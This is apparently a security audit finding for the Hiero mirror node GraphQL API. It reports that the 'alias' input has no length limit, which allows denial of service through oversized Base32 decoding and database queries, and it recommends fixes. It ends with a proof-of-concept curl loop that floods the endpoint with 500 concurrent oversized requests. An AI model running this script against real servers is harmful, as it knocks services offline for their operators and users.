### Title
Missing Maximum Length Constraint on GraphQL `alias` Input Enables Unbounded Resource Consumption (DoS)

### Summary
The `alias` field in `AccountInput` is validated only by a character-set pattern (`^[A-Z2-7]+$`) with no upper-bound length constraint. An unauthenticated attacker can submit an arbitrarily large alias string that passes validation, triggering unbounded Base32 decoding and a large-parameter database query on every request. Repeated requests cause memory and CPU exhaustion on the application server.

### Finding Description

**Schema definition — no `@Size` constraint:**

`graphql/src/main/resources/graphql/account.graphqls`, line 90:
```graphql
alias: String @Pattern(regexp: "^[A-Z2-7]+$")
``` [1](#0-0) 

The `@Pattern` directive validates only the character set. There is no `@Size(max=...)` or equivalent constraint. A string of 10,000 (or 10,000,000) characters composed entirely of `[A-Z2-7]` passes this check unconditionally.

**Controller — passes alias directly to service after `@Valid`:**

`graphql/src/main/java/org/hiero/mirror/graphql/controller/AccountController.java`, lines 33 and 47–48:
```java
Optional<Account> account(@Argument @Valid AccountInput input) {
    ...
    if (alias != null) {
        return entityService.getByAliasAndType(alias, EntityType.ACCOUNT).map(accountMapper::map);
    }
``` [2](#0-1) 

`@Valid` triggers Bean Validation, but since the only constraint is `@Pattern`, a 10,000-character valid-charset string passes and is forwarded to the service.

**Service — unconditional Base32 decode of the full string:**

`graphql/src/main/java/org/hiero/mirror/graphql/service/EntityServiceImpl.java`, lines 29–31:
```java
public Optional<Entity> getByAliasAndType(String alias, EntityType type) {
    return entityRepository.findByAlias(decodeBase32(alias)).filter(e -> e.getType() == type);
}
``` [3](#0-2) 

`decodeBase32` in `GraphQlUtils.java` calls Apache Commons Codec `BASE32.decode(alias)` with no length guard:
```java
public static byte[] decodeBase32(String base32) {
    return BASE32.decode(base32);
}
``` [4](#0-3) 

A 10,000-character Base32 string decodes to a ~6,250-byte array. A 1,000,000-character string decodes to ~625 KB — allocated per request, per thread.

**Repository — large byte array sent as equality parameter:**

`graphql/src/main/java/org/hiero/mirror/graphql/repository/EntityRepository.java`, lines 13–14:
```java
@Query(value = "select * from entity where alias = ?1 and deleted is not true", nativeQuery = true)
Optional<Entity> findByAlias(byte[] alias);
``` [5](#0-4) 

PostgreSQL receives a large `bytea` parameter for an equality comparison. While the index (`entity__alias`) is used, transmitting and comparing a multi-kilobyte parameter against an index built on short real-world alias values (32–64 bytes for ED25519/ECDSA public keys) adds unnecessary overhead per query. Under concurrent load, the combination of application-layer allocation and repeated DB round-trips with oversized parameters degrades throughput.

### Impact Explanation
An unauthenticated attacker can send a continuous stream of GraphQL requests with alias values of arbitrary length. Each request allocates a proportionally large byte array on the JVM heap and sends an oversized parameter to the database. With sufficient concurrency, this exhausts JVM heap memory (triggering GC pressure or OOM), saturates DB connection pool bandwidth, and degrades or denies service to legitimate users. No authentication, API key, or special privilege is required.

### Likelihood Explanation
The GraphQL endpoint is publicly accessible. The exploit requires only a standard HTTP client and knowledge of the GraphQL schema (which is introspectable by default). The attack is trivially scriptable: a single loop sending `alias: "AAAA...A"` (10,000+ chars) at high concurrency is sufficient. No prior account, token, or network access is needed beyond reaching the HTTP port.

### Recommendation
Add a maximum-length constraint to the `alias` field in the GraphQL schema. Real Hedera account aliases are at most 88 Base32 characters (encoding a 55-byte protobuf-wrapped public key). Apply a `@Size` or equivalent directive:

```graphql
alias: String @Pattern(regexp: "^[A-Z2-7]+$") @Size(max: 100)
```

Additionally, add a defensive length check in `GraphQlUtils.decodeBase32` or `EntityServiceImpl.getByAliasAndType` before decoding, and consider enabling a global GraphQL request body size limit at the HTTP layer.

### Proof of Concept
```bash
# Generate a 10000-character valid Base32 alias
ALIAS=$(python3 -c "print('A' * 10000)")

# Send to the GraphQL endpoint (no authentication required)
curl -s -X POST http://<mirror-node-host>/graphql/alpha \
  -H 'Content-Type: application/json' \
  -d "{\"query\": \"{ account(input: { alias: \\\"${ALIAS}\\\" }) { id } }\"}"

# Repeat at high concurrency to exhaust JVM heap / DB connection pool
for i in $(seq 1 500); do
  curl -s -X POST http://<mirror-node-host>/graphql/alpha \
    -H 'Content-Type: application/json' \
    -d "{\"query\": \"{ account(input: { alias: \\\"${ALIAS}\\\" }) { id } }\"}" &
done
wait
```

Each request passes `@Pattern` validation, triggers `BASE32.decode()` on a 10,000-character string, allocates a ~6,250-byte array, and issues a DB query with that oversized parameter. Scaling the alias length to 1,000,000 characters increases per-request heap allocation to ~625 KB with no server-side rejection.

### Citations

**File:** graphql/src/main/resources/graphql/account.graphqls (L89-90)
```text
    "A RFC 4648 Base32, with the trailing '=' characters removed, string that represents an account alias."
    alias: String @Pattern(regexp: "^[A-Z2-7]+$")
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/controller/AccountController.java (L33-48)
```java
    Optional<Account> account(@Argument @Valid AccountInput input) {
        final var alias = input.getAlias();
        final var evmAddress = input.getEvmAddress();
        final var entityId = input.getEntityId();
        final var id = input.getId();

        validateOneOf(alias, entityId, evmAddress, id);

        if (entityId != null) {
            return entityService
                    .getByIdAndType(toEntityId(entityId), EntityType.ACCOUNT)
                    .map(accountMapper::map);
        }

        if (alias != null) {
            return entityService.getByAliasAndType(alias, EntityType.ACCOUNT).map(accountMapper::map);
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/service/EntityServiceImpl.java (L29-31)
```java
    public Optional<Entity> getByAliasAndType(String alias, EntityType type) {
        return entityRepository.findByAlias(decodeBase32(alias)).filter(e -> e.getType() == type);
    }
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/util/GraphQlUtils.java (L83-85)
```java
    public static byte[] decodeBase32(String base32) {
        return BASE32.decode(base32);
    }
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/repository/EntityRepository.java (L13-14)
```java
    @Query(value = "select * from entity where alias = ?1 and deleted is not true", nativeQuery = true)
    Optional<Entity> findByAlias(byte[] alias);
```
